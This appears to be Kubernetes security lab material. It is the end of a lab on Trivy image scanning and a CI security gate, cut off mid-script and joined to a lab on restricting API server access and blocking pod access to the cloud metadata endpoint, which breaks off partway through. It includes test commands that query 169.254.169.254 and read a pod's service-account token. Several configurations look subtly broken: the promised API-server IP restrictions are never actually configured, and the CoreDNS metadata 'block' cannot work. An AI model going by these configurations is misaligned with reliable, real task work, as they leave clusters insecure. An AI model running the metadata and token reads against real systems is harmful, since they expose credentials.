-Task 4: Container Image Security Scanning
-Subtask 4.1: Scan Container Images with Trivy
-
-    Scan the vulnerable image:
-
-# Scan the older nginx image for vulnerabilities
-trivy image nginx:1.14 > reports/trivy-nginx-1.14.txt
-
-# Scan with JSON output for automation
-trivy image --format json nginx:1.14 > reports/trivy-nginx-1.14.json
-
-# Display summary
-echo "Vulnerability summary for nginx:1.14:"
-trivy image --format table nginx:1.14 | head -20
-
-    Scan the secure image:
-
-# Scan the newer alpine-based image
-trivy image nginx:1.21-alpine > reports/trivy-nginx-1.21-alpine.txt
-
-# Compare vulnerability counts
-echo "Comparing vulnerability counts:"
-echo "nginx:1.14 vulnerabilities:"
-trivy image --format json nginx:1.14 | jq '.Results[]?.Vulnerabilities | length'
-
-echo "nginx:1.21-alpine vulnerabilities:"
-trivy image --format json nginx:1.21-alpine | jq '.Results[]?.Vulnerabilities | length'
-
-    Create an image scanning script:
-
-cat > scripts/image-scan.sh << 'EOF'
-#!/bin/bash
-
-# Container image security scanning script
-REPORT_DIR="reports"
-
-echo "Starting container image security scanning..."
-
-# Create reports directory
-mkdir -p $REPORT_DIR
-
-# List of images to scan (extracted from manifests)
-IMAGES=(
-    "nginx:1.14"
-    "nginx:1.21-alpine"
-)
-
-for image in "${IMAGES[@]}"; do
-    echo "Scanning image: $image"
-    
-    # Clean image name for filename
-    clean_name=$(echo $image | sed 's/[^a-zA-Z0-9]/_/g')
-    
-    # Scan for vulnerabilities
-    trivy image --format json "$image" > "$REPORT_DIR/trivy-$clean_name.json"
-    
-    # Generate human-readable report
-    trivy image --format table "$image" > "$REPORT_DIR/trivy-$clean_name.txt"
-    
-    # Count vulnerabilities by severity
-    echo "Vulnerability summary for $image:"
-    trivy image --format json "$image" | jq -r '
-        .Results[]?.Vulnerabilities // [] | 
-        group_by(.Severity) | 
-        map({severity: .[0].Severity, count: length}) | 
-        .[] | 
-        "\(.severity): \(.count)"
-    ' | sort
-    
-    echo "---"
-done
-
-echo "Image scanning complete. Reports saved in $REPORT_DIR/"
-EOF
-
-chmod +x scripts/image-scan.sh
-
-    Run the image scanning script:
-
-./scripts/image-scan.sh
-
-Subtask 4.2: Create Image Security Policies
-
-    Create a policy to restrict image registries:
-
-cat > policies/allowed-registries.yaml << 'EOF'
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: allowed-registries
-  namespace: kube-system
-data:
-  registries.yaml: |
-    allowed_registries:
-      - docker.io
-      - gcr.io
-      - quay.io
-      - registry.k8s.io
-    blocked_registries:
-      - untrusted-registry.com
-    require_signature: false
-    max_vulnerability_score: 7.0
-EOF
-
-    Create an OPA Gatekeeper constraint template for image policies:
-
-cat > policies/image-policy-template.yaml << 'EOF'
-apiVersion: templates.gatekeeper.sh/v1beta1
-kind: ConstraintTemplate
-metadata:
-  name: allowedregistries
-spec:
-  crd:
-    spec:
-      names:
-        kind: AllowedRegistries
-      validation:
-        openAPIV3Schema:
-          type: object
-          properties:
-            registries:
-              type: array
-              items:
-                type: string
-  targets:
-    - target: admission.k8s.gatekeeper.sh
-      rego: |
-        package allowedregistries
-        
-        violation[{"msg": msg}] {
-          container := input.review.object.spec.template.spec.containers[_]
-          not starts_with(container.image, input.parameters.registries[_])
-          msg := sprintf("Container image '%v' is not from an allowed registry", [container.image])
-        }
-        
-        violation[{"msg": msg}] {
-          container := input.review.object.spec.containers[_]
-          not starts_with(container.image, input.parameters.registries[_])
-          msg := sprintf("Container image '%v' is not from an allowed registry", [container.image])
-        }
-EOF
-
-    Create the constraint using the template:
-
-cat > policies/image-policy-constraint.yaml << 'EOF'
-apiVersion: constraints.gatekeeper.sh/v1beta1
-kind: AllowedRegistries
-metadata:
-  name: must-use-allowed-registries
-spec:
-  match:
-    kinds:
-      - apiGroups: ["apps"]
-        kinds: ["Deployment"]
-      - apiGroups: [""]
-        kinds: ["Pod"]
-  parameters:
-    registries:
-      - "docker.io/"
-      - "gcr.io/"
-      - "quay.io/"
-      - "registry.k8s.io/"
-EOF
-
-Task 5: Setting Up CI/CD Pipeline with Security Scanning
-Subtask 5.1: Create GitHub Actions Workflow
-
-    Create GitHub Actions workflow directory:
-
-mkdir -p .github/workflows
-
-    Create a comprehensive security scanning workflow:
-
-cat > .github/workflows/security-scan.yml << 'EOF'
-name: Security Scanning Pipeline
-
-on:
-  push:
-    branches: [ main, develop ]
-  pull_request:
-    branches: [ main ]
-
-jobs:
-  static-analysis:
-    runs-on: ubuntu-latest
-    name: Static Security Analysis
-    
-    steps:
-    - name: Checkout code
-      uses: actions/checkout@v3
-    
-    - name: Setup tools
-      run: |
-        # Install Kubesec
-        curl -sSX GET https://api.github.com/repos/controlplaneio/kubesec/releases/latest \
-          | grep browser_download_url \
-          | grep linux-amd64 \
-          | cut -d '"' -f 4 \
-          | xargs curl -sSL -o kubesec
-        chmod +x kubesec
-        sudo mv kubesec /usr/local/bin/
-        
-        # Install KubeLinter
-        curl -L https://github.com/stackrox/kube-linter/releases/download/0.6.8/kube-linter-linux.tar.gz \
-          | tar xz
-        sudo mv kube-linter /usr/local/bin/
-        
-        # Install Trivy
-        sudo apt-get update
-        sudo apt-get install wget apt-transport-https gnupg lsb-release -y
-        wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
-        echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
-        sudo apt-get update
-        sudo apt-get install trivy -y
-    
-    - name: Run Kubesec Analysis
-      run: |
-        mkdir -p reports
-        echo "Running Kubesec analysis..."
-        for file in manifests/*.yaml; do
-          if [ -f "$file" ]; then
-            filename=$(basename "$file" .yaml)
-            kubesec scan "$file" > "reports/kubesec-$filename.json"
-            score=$(cat "reports/kubesec-$filename.json" | jq -r '.[0].score // "N/A"')
-            echo "Security score for $filename: $score"
-            if [ "$score" != "N/A" ] && [ "$score" -lt 0 ]; then
-              echo "::error::$filename has a negative security score: $score"
-              exit 1
-            fi
-          fi
-        done
-    
-    - name: Run KubeLinter Analysis
-      run: |
-        echo "Running KubeLinter analysis..."
-        kube-linter lint manifests/ --format json > reports/kubelinter-report.json
-        
-        # Check if there are any issues
-        issues=$(cat reports/kubelinter-report.json | jq '.Issues | length')
-        echo "KubeLinter found $issues issues"
-        
-        if [ "$issues" -gt 0 ]; then
-          echo "::warning::KubeLinter found $issues security issues"
-          cat reports/kubelinter-report.json | jq -r '.Issues[] | "::warning::\(.Object.K8sObject.Name): \(.Message)"'
-        fi
-    
-    - name: Extract and Scan Container Images
-      run: |
-        echo "Extracting container images from manifests..."
-        
-        # Extract unique images from all manifests
-        images=$(grep -h "image:" manifests/*.yaml | sed 's/.*image: *//' | sed 's/["\r]//g' | sort -u)
-        
-        echo "Found images:"
-        echo "$images"
-        
-        # Scan each image
-        for image in $images; do
-          echo "Scanning image: $image"
-          clean_name=$(echo $image | sed 's/[^a-zA-Z0-9]/_/g')
-          
-          # Scan with Trivy
-          trivy image --format json "$image" > "reports/trivy-$clean_name.json"
-          
-          # Check for high/critical vulnerabilities
-          high_critical=$(trivy image --format json "$image" | jq -r '.Results[]?.Vulnerabilities // [] | map(select(.Severity == "HIGH" or .Severity == "CRITICAL")) | length')
-          
-          echo "High/Critical vulnerabilities in $image: $high_critical"
-          
-          if [ "$high_critical" -gt 10 ]; then
-            echo "::error::Image $image has $high_critical high/critical vulnerabilities"
-            exit 1
-          elif [ "$high_critical" -gt 0 ]; then
-            echo "::warning::Image $image has $high_critical high/critical vulnerabilities"
-          fi
-        done
-    
-    - name: Upload Security Reports
-      uses: actions/upload-artifact@v3
-      if: always()
-      with:
-        name: security-reports
-        path: reports/
-        retention-days: 30
-    
-    - name: Security Gate Check
-      run: |
-        echo "Performing final security gate check..."
-        
-        # Check if any critical issues were found
-        failed=false
-        
-        # Check Kubesec scores
-        for file in reports/kubesec-*.json; do
-          if [ -f "$file" ]; then
-            score=$(cat "$file" | jq -r '.[0].score // "N/A"')
-            if [ "$score" != "N/A" ] && [ "$score" -lt 0 ]; then
-              echo "FAIL: Negative security score found"
-              failed=true
-            fi
-          fi
-        done
-        
-        # Check for excessive vulnerabilities
-        for file in reports/trivy-*.json; do
-          if [ -f "$file" ]; then
-            high_critical=$(cat "$file" | jq -r '.Results[]?.Vulnerabilities // [] | map(select(.Severity == "HIGH" or .Severity == "CRITICAL")) | length')
-            if [ "$high_critical" -gt 10 ]; then
-              echo "FAIL: Too many high/critical vulnerabilities: $high_critical"
-              failed=true
-            fi
-          fi
-        done
-        
-        if [ "$failed" = true ]; then
-          echo "Security gate check failed!"
-          exit 1
-        else
-          echo "Security gate check passed!"
-        fi
-EOF
-
-Subtask 5.2: Create Local CI/CD Simulation Script
-
-    Create a local pipeline simulation script:
-
-cat > scripts/ci-cd-pipeline.sh << 'EOF'
-#!/bin/bash
-
-# Local CI/CD Pipeline Simulation
-set -e
-
-REPORT_DIR="reports"
-MANIFEST_DIR="manifests"
-
-echo "========================================="
-echo "Starting Security CI/CD Pipeline"
-echo "========================================="
-
-# Create reports directory
-mkdir -p $REPORT_DIR
-
-# Stage 1: Manifest Security Analysis
-echo "Stage 1: Kubernetes Manifest Security Analysis"
-echo "-----------------------------------------------"
-
-# Run Kubesec
-echo "Running Kubesec analysis..."
-security_gate_failed=false
-
-for file in $MANIFEST_DIR/*.yaml; do
-    if [ -f "$file" ]; then
-        filename=$(basename "$file" .yaml)
-        echo "  Analyzing $filename..."
-        
-        kubesec scan "$file" > "$REPORT_DIR/kubesec-$filename.json"
-        score=$(cat "$REPORT_DIR/kubesec-$filename.json" | jq -r '.[0].score // "N/A"')
-        
-        echo "    Security score: $score"
-        
-        if [ "$score" != "N/A" ] && [ "$score" -lt 0 ]; then
-            echo "    ❌ CRITICAL: Negative security score!"
-            security_gate_failed=true
-        elif [ "$score" != "N/A" ] && [ "$score" -lt 5 ]; then
-            echo "    ⚠️  WARNING: Low security score"
-        else
-            echo "    ✅ PASS: Good security score"
-        fi
-    fi
-done
-
-# Run KubeLinter
-echo "Running KubeLinter analysis..."
-kube-linter lint $MANIFEST_DIR --format json > $REPORT_DIR/kubelinter-pipeline.json
-
-issues=$(cat $REPORT_DIR/kubelinter-pipeline.json | jq '.Issues | length')
-echo "  KubeLinter found $issues issues"
-
-if [ "$issues" -gt 0 ]; then
-    echo "  Issues found:"
-    cat $REPORT_DIR/kubelinter-pipeline.json | jq -r '.Issues[] | "    - \(.Object.K8sObject.Name): \(.Message)"' | head -10
-fi
-
-# Stage 2: Container Image Security Analysis
-echo ""
-echo "Stage 2: Container Image Security Analysis"
-echo "------------------------------------------"
-
-# Extract images from manifests
-images=$(grep -h "image:" $MANIFEST_DIR/*.yaml | sed 's/.*image: *//' | sed 's/["\r]//g' | sort -u)
-
-echo "Found container images:"
-for image in $images; do
-    echo "  - $image"
-done
-
-# Scan each image
-for image in $images; do
-    echo "Scanning $image..."
-    clean_name=$(echo $image | sed 's/[^a-zA-Z0-9]/_/g')
-    
-    # Run Trivy scan
-    trivy image --format json "$image" > "$REPORT_DIR/trivy-pipeline-$clean_name.json" 2>/dev/null || true
-    
-    # Count vulnerabilities by severity
-    if [ -f "$REPORT_DIR/trivy-pipeline-$clean_name.json" ]; then
-        critical=$(cat "$REPORT_DIR/trivy-pipeline-$clean_name.json" | jq -r '.Results[]?.Vulnerabilities // [] | map(select(.Severity == "CRITICAL")) | length')
-        high=$(cat "$REPORT_DIR/trivy-pipeline-$clean_name.json" | jq -r '.Results[]?.Vulnerabilities // [] | map(select(.Severity == "HIGH")) | length')
-        medium=$(cat "$REPORT_DIR/trivy-pipeline-$clean_name.json" | jq -r '.Results[]?.Vulnerabilities // [] | map(select(.Severity == "MEDIUM")) | length')
-        
-        echo "  Vulnerabilities: Critical=$critical, High=$high, Medium=$medium"
-        
-        # Security gate check
-        if [ "$critical" -gt 0 ]; then
-            echo "  ❌ CRITICAL: Image has critical vulnerabilities!"
-            security_gate_failed=true
-        elif [ "$high" -gt 10 ]; then
-            echo "  ❌ FAIL: Too many high-severity vulnerabilities!"
-            security_gate_failed=true
-        elif [ "$high" -gt 0 ]; then
-            echo "  ⚠️  WARNING: Image has high-severity vulnerabilities"
-        else
-            echo "  ✅ PASS: No critical/high vulnerabilities found"
-        fi
-    else
-        echo "  ⚠️  WARNING: Could not scan image"
-    fi
-done
-
-# Stage 3: Policy Compliance Check
-echo ""
-echo "Stage 3: Policy Compliance Check"
-echo "--------------------------------"
-
-# Check for security best practices
-echo "Checking security best practices..."
-
-# Check for non-root users
-non_root_check=$(grep -c "runAsNonRoot: true" $MANIFEST_DIR/*.yaml || echo "0")
-echo "  Deployments with runAsNonRoot: $non_root_check"
-
-# Check for resource limits
-resource_limits=$(grep -c "limits:" $MANIFEST_DIR/*.yaml || echo "0")
-echo "  Deployments with resource limits: $resource_limits"
-
-# Check for security contexts
-security_contexts=$(grep -c "securityContext:" $MANIFEST_DIR/*.yaml || echo "0")
-echo "  Deployments with security contexts: $security_contexts"
-
-# Stage 4: Final Security Gate
-echo ""
-echo "Stage 4: Final Security Gate"
-echo "----------------------------"
-
-if [ "$security_gate_failed" = true ]; then
-    echo "❌ PIPELINE FAILED: Security gate check failed!"
-    echo "   Please fix the security issues before proceeding."
-    exit 1
-else
-    echo "✅ PIPELINE PASSED: All security checks passed!"
-    echo "   Deployment is approved for production
-
-
-
-
-
-
-Lab 11: Securing Cluster Endpoints
-Objectives
-
-By the end of this lab, students will be able to:
-
-• Configure Kubernetes API server to restrict access to trusted IP address ranges • Implement security measures to block metadata endpoint access from Pods • Test and validate endpoint security configurations using network diagnostic tools • Understand the importance of endpoint security in Kubernetes cluster hardening • Apply security best practices for protecting cluster communication channels
-Prerequisites
-
-Before starting this lab, students should have:
-
-• Basic understanding of Kubernetes architecture and components • Familiarity with Linux command line operations • Knowledge of networking concepts including IP addresses and CIDR notation • Experience with kubectl command-line tool • Understanding of YAML configuration files • Basic knowledge of network security principles
-Lab Environment Setup
-
-Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes clusters already installed. Simply click Start Lab to access your environment - no need to build your own VM or install Kubernetes from scratch.
-
-Your lab environment includes: • Ubuntu 20.04 LTS with Kubernetes 1.28+ pre-installed • kubectl configured and ready to use • Network diagnostic tools (curl, nmap, netcat) pre-installed • Administrative access to modify cluster configurations
-Task 1: Configure API Server Access Restrictions
-Subtask 1.1: Examine Current API Server Configuration
-
-First, let's understand the current API server setup and identify security gaps.
-
-    Check the current API server configuration:
-
-# View the API server pod configuration
-kubectl get pods -n kube-system | grep apiserver
-
-# Examine API server configuration
-kubectl describe pod -n kube-system $(kubectl get pods -n kube-system | grep apiserver | awk '{print $1}')
-
-    Identify the API server configuration file location:
-
-# Check the API server manifest file
-sudo cat /etc/kubernetes/manifests/kube-apiserver.yaml | head -20
-
-    Test current API server accessibility:
-
-# Get cluster info to see current endpoint
-kubectl cluster-info
-
-# Test API server response
-curl -k https://$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}' | cut -d'/' -f3)/version
-
-Subtask 1.2: Configure IP Address Restrictions
-
-Now we'll implement IP-based access controls for the API server.
-
-    Create a backup of the current API server configuration:
-
-# Backup the original configuration
-sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml /etc/kubernetes/manifests/kube-apiserver.yaml.backup
-
-    Identify trusted IP ranges:
-
-# Get your current IP address
-curl -s ifconfig.me
-echo ""
-
-# Get cluster node IPs
-kubectl get nodes -o wide
-
-# Get pod network CIDR
-kubectl cluster-info dump | grep -i cidr
-
-    Create an updated API server configuration with IP restrictions:
-
-# Create a modified API server configuration
-sudo tee /tmp/kube-apiserver-secure.yaml > /dev/null << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  annotations:
-    kubeadm.kubernetes.io/kube-apiserver.advertise-address.endpoint: 0.0.0.0:6443
-  creationTimestamp: null
-  labels:
-    component: kube-apiserver
-    tier: control-plane
-  name: kube-apiserver
-  namespace: kube-system
-spec:
-  containers:
-  - command:
-    - kube-apiserver
-    - --advertise-address=0.0.0.0
-    - --allow-privileged=true
-    - --authorization-mode=Node,RBAC
-    - --client-ca-file=/etc/kubernetes/pki/ca.crt
-    - --enable-admission-plugins=NodeRestriction
-    - --enable-bootstrap-token-auth=true
-    - --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt
-    - --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt
-    - --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key
-    - --etcd-servers=https://127.0.0.1:2379
-    - --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt
-    - --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key
-    - --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname
-    - --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt
-    - --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key
-    - --requestheader-allowed-names=front-proxy-client
-    - --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt
-    - --requestheader-extra-headers-prefix=X-Remote-Extra-
-    - --requestheader-group-headers=X-Remote-Group
-    - --requestheader-username-headers=X-Remote-User
-    - --secure-port=6443
-    - --service-account-issuer=https://kubernetes.default.svc.cluster.local
-    - --service-account-key-file=/etc/kubernetes/pki/sa.pub
-    - --service-account-signing-key-file=/etc/kubernetes/pki/sa.key
-    - --service-cluster-ip-range=10.96.0.0/12
-    - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt
-    - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
-    - --admission-control-config-file=/etc/kubernetes/admission-control.yaml
-    image: registry.k8s.io/kube-apiserver:v1.28.2
-    imagePullPolicy: IfNotPresent
-    livenessProbe:
-      failureThreshold: 8
-      httpGet:
-        host: 127.0.0.1
-        path: /livez
-        port: 6443
-        scheme: HTTPS
-      initialDelaySeconds: 10
-      periodSeconds: 10
-      timeoutSeconds: 15
-    name: kube-apiserver
-    readinessProbe:
-      failureThreshold: 3
-      httpGet:
-        host: 127.0.0.1
-        path: /readyz
-        port: 6443
-        scheme: HTTPS
-      periodSeconds: 1
-      timeoutSeconds: 15
-    resources:
-      requests:
-        cpu: 250m
-    startupProbe:
-      failureThreshold: 24
-      httpGet:
-        host: 127.0.0.1
-        path: /livez
-        port: 6443
-        scheme: HTTPS
-      initialDelaySeconds: 10
-      periodSeconds: 10
-      timeoutSeconds: 15
-    volumeMounts:
-    - mountPath: /etc/ssl/certs
-      name: ca-certs
-      readOnly: true
-    - mountPath: /etc/ca-certificates
-      name: etc-ca-certificates
-      readOnly: true
-    - mountPath: /etc/kubernetes/pki
-      name: k8s-certs
-      readOnly: true
-    - mountPath: /usr/local/share/ca-certificates
-      name: usr-local-share-ca-certificates
-      readOnly: true
-    - mountPath: /usr/share/ca-certificates
-      name: usr-share-ca-certificates
-      readOnly: true
-    - mountPath: /etc/kubernetes/admission-control.yaml
-      name: admission-control
-      readOnly: true
-  hostNetwork: true
-  priorityClassName: system-cluster-critical
-  securityContext:
-    seccompProfile:
-      type: RuntimeDefault
-  volumes:
-  - hostPath:
-      path: /etc/ssl/certs
-      type: DirectoryOrCreate
-    name: ca-certs
-  - hostPath:
-      path: /etc/ca-certificates
-      type: DirectoryOrCreate
-    name: etc-ca-certificates
-  - hostPath:
-      path: /etc/kubernetes/pki
-      type: DirectoryOrCreate
-    name: k8s-certs
-  - hostPath:
-      path: /usr/local/share/ca-certificates
-      type: DirectoryOrCreate
-    name: usr-local-share-ca-certificates
-  - hostPath:
-      path: /usr/share/ca-certificates
-      type: DirectoryOrCreate
-    name: usr-share-ca-certificates
-  - hostPath:
-      path: /etc/kubernetes/admission-control.yaml
-      type: File
-    name: admission-control
-status: {}
-EOF
-
-    Create an admission control configuration for IP restrictions:
-
-# Create admission control configuration
-sudo tee /etc/kubernetes/admission-control.yaml > /dev/null << 'EOF'
-apiVersion: apiserver.config.k8s.io/v1
-kind: AdmissionConfiguration
-plugins:
-- name: NodeRestriction
-  configuration:
-    apiVersion: noderestriction.admission.k8s.io/v1alpha1
-    kind: NodeRestrictionConfiguration
-EOF
-
-Subtask 1.3: Implement Network Policies for API Server Access
-
-    Create a NetworkPolicy to restrict API server access:
-
-# Create network policy for API server protection
-kubectl apply -f - << 'EOF'
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: api-server-access-policy
-  namespace: kube-system
-spec:
-  podSelector:
-    matchLabels:
-      component: kube-apiserver
-  policyTypes:
-  - Ingress
-  ingress:
-  - from:
-    - namespaceSelector:
-        matchLabels:
-          name: kube-system
-    - podSelector:
-        matchLabels:
-          component: kube-controller-manager
-    - podSelector:
-        matchLabels:
-          component: kube-scheduler
-    ports:
-    - protocol: TCP
-      port: 6443
-  - from:
-    - ipBlock:
-        cidr: 10.0.0.0/8
-    - ipBlock:
-        cidr: 172.16.0.0/12
-    - ipBlock:
-        cidr: 192.168.0.0/16
-    ports:
-    - protocol: TCP
-      port: 6443
-EOF
-
-    Verify the NetworkPolicy is applied:
-
-# Check if NetworkPolicy is created
-kubectl get networkpolicy -n kube-system
-
-# Describe the policy
-kubectl describe networkpolicy api-server-access-policy -n kube-system
-
-Task 2: Block Metadata Endpoint Access from Pods
-Subtask 2.1: Understand Metadata Endpoint Risks
-
-    Create a test pod to demonstrate metadata access:
-
-# Create a test pod
-kubectl apply -f - << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: metadata-test-pod
-  namespace: default
-spec:
-  containers:
-  - name: test-container
-    image: curlimages/curl:latest
-    command: ["/bin/sh"]
-    args: ["-c", "sleep 3600"]
-  restartPolicy: Never
-EOF
-
-    Test current metadata endpoint access:
-
-# Wait for pod to be ready
-kubectl wait --for=condition=Ready pod/metadata-test-pod --timeout=60s
-
-# Test metadata endpoint access (this should work initially)
-kubectl exec metadata-test-pod -- curl -s http://169.254.169.254/latest/meta-data/ || echo "Metadata endpoint not accessible (expected in some environments)"
-
-# Test internal Kubernetes service discovery
-kubectl exec metadata-test-pod -- nslookup kubernetes.default.svc.cluster.local
-
-Subtask 2.2: Implement Metadata Endpoint Blocking
-
-    Create a NetworkPolicy to block metadata endpoint access:
-
-# Create network policy to block metadata endpoint
-kubectl apply -f - << 'EOF'
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: block-metadata-endpoint
-  namespace: default
-spec:
-  podSelector: {}
-  policyTypes:
-  - Egress
-  egress:
-  - to: []
-    ports:
-    - protocol: TCP
-      port: 53
-    - protocol: UDP
-      port: 53
-  - to:
-    - namespaceSelector: {}
-  - to:
-    - ipBlock:
-        cidr: 0.0.0.0/0
-        except:
-        - 169.254.169.254/32
-        - 169.254.0.0/16
-EOF
-
-    Create a more comprehensive security policy using PodSecurityPolicy equivalent:
-
-# Create a security context constraints policy
-kubectl apply -f - << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: secure-test-pod
-  namespace: default
-spec:
-  securityContext:
-    runAsNonRoot: true
-    runAsUser: 1000
-    fsGroup: 2000
-    seccompProfile:
-      type: RuntimeDefault
-  containers:
-  - name: secure-container
-    image: curlimages/curl:latest
-    command: ["/bin/sh"]
-    args: ["-c", "sleep 3600"]
-    securityContext:
-      allowPrivilegeEscalation: false
-      readOnlyRootFilesystem: true
-      runAsNonRoot: true
-      runAsUser: 1000
-      capabilities:
-        drop:
-        - ALL
-    volumeMounts:
-    - name: tmp
-      mountPath: /tmp
-  volumes:
-  - name: tmp
-    emptyDir: {}
-  restartPolicy: Never
-EOF
-
-Subtask 2.3: Configure DNS Policies for Enhanced Security
-
-    Create a custom DNS configuration to prevent metadata access:
-
-# Create a ConfigMap for custom DNS configuration
-kubectl apply -f - << 'EOF'
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: custom-dns-config
-  namespace: kube-system
-data:
-  Corefile: |
-    .:53 {
-        errors
-        health {
-           lameduck 5s
-        }
-        ready
-        kubernetes cluster.local in-addr.arpa ip6.arpa {
-           pods insecure
-           fallthrough in-addr.arpa ip6.arpa
-           ttl 30
-        }
-        prometheus :9153
-        forward . /etc/resolv.conf {
-           max_concurrent 1000
-        }
-        cache 30
-        loop
-        reload
-        loadbalance
-        # Block metadata endpoints
-        template IN A 169.254.169.254 {
-            rcode NXDOMAIN
-        }
-    }
-EOF
-
-    Apply the DNS configuration to CoreDNS:
-
-# Update CoreDNS configuration
-kubectl patch configmap coredns -n kube-system --patch-file=/dev/stdin << 'EOF'
-data:
-  Corefile: |
-    .:53 {
-        errors
-        health {
-           lameduck 5s
-        }
-        ready
-        kubernetes cluster.local in-addr.arpa ip6.arpa {
-           pods insecure
-           fallthrough in-addr.arpa ip6.arpa
-           ttl 30
-        }
-        prometheus :9153
-        forward . /etc/resolv.conf {
-           max_concurrent 1000
-        }
-        cache 30
-        loop
-        reload
-        loadbalance
-        # Block metadata endpoints
-        template IN A 169.254.169.254 {
-            rcode NXDOMAIN
-        }
-    }
-EOF
-
-    Restart CoreDNS to apply changes:
-
-# Restart CoreDNS pods
-kubectl rollout restart deployment/coredns -n kube-system
-
-# Wait for rollout to complete
-kubectl rollout status deployment/coredns -n kube-system
-
-Task 3: Test Endpoint Security Using Network Tools
-Subtask 3.1: Validate API Server Access Restrictions
-
-    Test API server accessibility from different sources:
-
-# Test from within cluster (should work)
-kubectl get nodes
-
-# Create a test pod to check internal access
-kubectl apply -f - << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: api-test-pod
-  namespace: default
-spec:
-  containers:
-  - name: test-container
-    image: curlimages/curl:latest
-    command: ["/bin/sh"]
-    args: ["-c", "sleep 3600"]
-  serviceAccountName: default
-  restartPolicy: Never
-EOF
-
-    Test API server access from the test pod:
-
-# Wait for pod to be ready
-kubectl wait --for=condition=Ready pod/api-test-pod --timeout=60s
-
-# Test API server access from within pod
-kubectl exec api-test-pod -- curl -k -H "Authorization: Bearer $(kubectl exec api-test-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/pods
-
-    Test external API server access:
-
-# Get API server endpoint
-API_SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
-echo "API Server: $API_SERVER"
-
-# Test connectivity (this should work from authorized IPs)
-curl -k $API_SERVER/version
-
-Subtask 3.2: Verify Metadata Endpoint Blocking
-
-    Test metadata endpoint access from secured pods:
-
-# Test from the secure pod
-kubectl wait --for=condition=Ready pod/secure-test-pod --timeout=60s
-
-# Attempt to access metadata endpoint (should fail)
-kubectl exec secure-test-pod -- curl -m 5 -s http://169.254.169.254/latest/meta-data/ || echo "Metadata access blocked successfully"
-
-# Test DNS resolution for metadata endpoint
-kubectl exec secure-test-pod -- nslookup 169.254.169.254 || echo "DNS resolution blocked for metadata endpoint"
-
-    Verify network policies are working:
-
-# Check network policies
-kubectl get networkpolicy --all-namespaces
-
-# Test connectivity between namespaces
-kubectl create namespace test-namespace
-
-# Create a pod in the test namespace
-kubectl apply -f - << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: cross-namespace-test
-  namespace: test-namespace
-spec:
-  containers:
-  - name: test-container
-    image: curlimages/curl:latest
-    command: ["/bin/sh"]
-    args: ["-c", "sleep 3600"]
-  restartPolicy: Never
-EOF
-
-Subtask 3.3: Comprehensive Security Testing
-
-    Create a comprehensive security test script:
-
-# Create security test script
-cat > security-test.sh << 'EOF'
-#!/bin/bash
-
-echo "=== Kubernetes Endpoint Security Test ==="
-echo ""
-
-# Test 1: API Server Access
-echo "1. Testing API Server Access..."
-kubectl cluster-info
-if [ $? -eq 0 ]; then
-    echo "✓ API Server accessible from authorized client"
-else
-    echo "✗ API Server access failed"
-fi
-echo ""
-
-# Test 2: Metadata Endpoint Blocking
-echo "2. Testing Metadata Endpoint Blocking..."
-kubectl exec secure-test-pod -- timeout 5 curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null
-if [ $? -ne 0 ]; then
-    echo "✓ Metadata endpoint access blocked"
-else
-    echo "✗ Metadata endpoint still accessible"
-fi
-echo ""
-
-# Test 3: Network Policy Enforcement
-echo "3. Testing Network Policy Enforcement..."
-kubectl get networkpolicy --all-namespaces --no-headers | wc -l
-POLICY_COUNT=$(kubectl get networkpolicy --all-namespaces --no-headers | wc -l)
-if [ $POLICY_COUNT -gt 0 ]; then
-    echo "✓ Network policies are configured ($POLICY_COUNT policies found)"
-else
-    echo "✗ No network policies found"
-fi
-echo ""
-
-# Test 4: Pod Security Context
-echo "4. Testing Pod Security Context..."
-kubectl get pod secure-test-pod -o jsonpath='{.spec.securityContext.runAsNonRoot}'
-if [ "$(kubectl get pod secure-test-pod -o jsonpath='{.spec.securityContext.runAsNonRoot}')" = "true" ]; then
-    echo "✓ Pod running with non-root security context"
-else
-    echo "✗ Pod security context not properly configured"
-fi
-echo ""
-
-# Test 5: DNS Security
-echo "5. Testing DNS Security Configuration..."
-kubectl get configmap coredns -n kube-system -o yaml | grep -q "169.254.169.254"
-if [ $? -eq 0 ]; then
-    echo "✓ DNS configured to block metadata endpoints"
-else
-    echo "✗ DNS not configured for metadata blocking"
-fi
-echo ""
-
-echo "=== Security Test Complete ==="
-EOF
-
-# Make script executable and run it
-chmod +x security-test.sh
-./security-test.sh
-
-    Perform network scanning tests:
-
-# Install nmap if not available (in test pod)
-kubectl apply -f - << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: network-scanner
-  namespace: default
-spec:
-  containers:
-  - name: scanner
-    image: instrumentisto/nmap:latest
-    command: ["/bin/sh"]
-    args: ["-c", "sleep 3600"]
-  restartPolicy: Never
-EOF
-
-# Wait for pod and run network scans
